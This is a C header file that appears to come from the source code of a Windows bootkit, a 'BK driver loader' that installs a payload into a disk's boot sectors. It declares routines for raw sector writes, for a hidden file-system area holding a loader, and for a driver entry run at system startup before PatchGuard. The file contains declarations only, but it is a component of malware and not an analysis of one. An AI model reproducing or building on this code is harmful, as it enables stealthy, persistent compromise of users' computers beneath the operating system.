//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: bklib.h
// $Revision: 67 $
// $Date: 2012-05-29 22:20:56 +0400 (Вт, 29 май 2012) $
// description: 
//	BK helper library. Contains BK installation and BK driver initialization routines.


#define		BK_IO_READ		1
#define		BK_IO_WRITE		2


typedef	NTSTATUS (_stdcall* PBK_INSTALL_CALLBACK)	(PVOID	pLoaderContext);
typedef NTSTATUS (_stdcall*	PBK_DRIVER_CALLBACK)	(PVOID	pDriverObject, PUNICODE_STRING pusRegistryPath);
typedef	PVOID (_stdcall* PBK_GET_MODULE_BASE)		(PCHAR	ModuleName);		


PVOID	BkNtKernelBase;		//	NT kernel base
PVOID	BkImageBase;		//	Current driver base


//
//	Generates pseudo random number based on the specified seed value.
//
ULONG BkRandom(PULONG pSeed);


//
//	BK initialization routine. Normally called twice: 
//	 - when BK loads the driver, is this case pDriverObject == 0 and pusRegistryPath is pointer to PBK_LDR_CONTEXT structure.
//	 - when the driver being registered by the OS.
//
NTSTATUS BkInitialize(
	PVOID					pDriverObject,
	PUNICODE_STRING			pusRegistryPath,
	PBK_INSTALL_CALLBACK	pfnInstallRoutine,
	PBK_DRIVER_CALLBACK		pfnDriverRoutine
	);


//
//	Driver initialization routine.
//	Called from nt!KiSystemStartup. 
//	IDT is not initialized yet. Interrupts are disabled. Only one CPU enabled. No PatchGuard. IRQL = DISPATCH_LEVEL. 
//	Debugger is unaccessable since KD is not initialized too.
//	SSE, SSE2 should be used very carefully, since no SSE state was saved before the call.
//
NTSTATUS	BkInstall(PVOID	LdrContext);


//
// Retrieves a module base for the specified module.
//
PVOID	BkGetModuleBase(
	PCHAR	ModuleName
	);


//
// Retrieves the address of an exported function or variable from the specified module.
//
PVOID	BkGetFunctionAddress(
	PVOID	ImageBase,			// target module base
	PCHAR	FunctionName		// target function name (case sensitive)
	);


//
//	Returns the export entry address for the specified function of the specified module.
//
PVOID	BkGetExportEntry(
	PVOID	ImageBase,			// target module base
	PCHAR	FunctionName		// target function name (case sensitive)
	);


//
//	Resolves specified executable image import.
//
NTSTATUS BkResolveImageImport(
	PVOID	ImageBase,						// Image base
	PBK_GET_MODULE_BASE	pBkGetModuleBase	// Pointer to a function used to resolve imported module bases. 
											// Can be either BkGetModuleBase() or any other function depending on architecture.
	);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	BK file system area descriptor.
typedef struct _BK_FS_AREA
{
	PUNICODE_STRING pDeviceName;		// Name of the device where BK FS partition located
	HANDLE			hDevice;			// Handle to the device
	ULONGLONG		StartSector;		// Start sector of the BK FS partition
	ULONG			NumberOfSectors;	// Number of sectors within BK FS partition
	ULONG			BytesPerSector;		// Bytes per sector 
	ULONGLONG		BootSector;			// Boot sector of the active partition (containing initial loader)
} BK_FS_AREA, *PBK_FS_AREA;


// Minimum supportd FS size
#define		BK_FS_SIZE_MIN				2000	// sectors
#define		BK_FS_RESERVED_SECTORS		1		// number of FS reserved sectors
#define		BK_FS_NUMBER_FATS			1		// number of File allocation tables
#define		BK_FS_SECTORS_PER_ROOT		1		// initial Root directory size (sectors)
#define		BK_FS_BOOT_FILE_SIZE		102400	// size of BOOT.SYS file (the place for the loader) in bytes	



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Installs BK to load the specified driver.
#ifdef _cplusplus
	extern "C"
	{
#endif
	ULONG	_stdcall 	BkSetupWithPayload(PCHAR BootLoader, ULONG BootSize, PCHAR Payload, ULONG PayloadSize);
	NTSTATUS _stdcall	BkSectorIo(PUNICODE_STRING DriveName, PCHAR Buffer, ULONG Length, ULONGLONG StartSector, ULONG Count, ULONG	Flags);
	NTSTATUS _stdcall	BkGetDriveGeometry(PUNICODE_STRING DriveName, PVOID pDriveGeo);
	NTSTATUS _stdcall 	BkAllocateFsArea(PBK_FS_AREA pFsArea, PVOID	WorkBuffer);
#ifdef _cpluplus
	}
#endif


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Disk sector read-write routines

#define		BkReadSectors(uDriveName, pBuffer, Length, StartSector, Count)	\
				BkSectorIo(uDriveName, pBuffer, Length, StartSector, Count, BK_IO_READ)

#define		BkWriteSectors(uDriveName, pBuffer, Length, StartSector, Count)	\
				BkSectorIo(uDriveName, pBuffer, Length, StartSector, Count, BK_IO_WRITE)
	

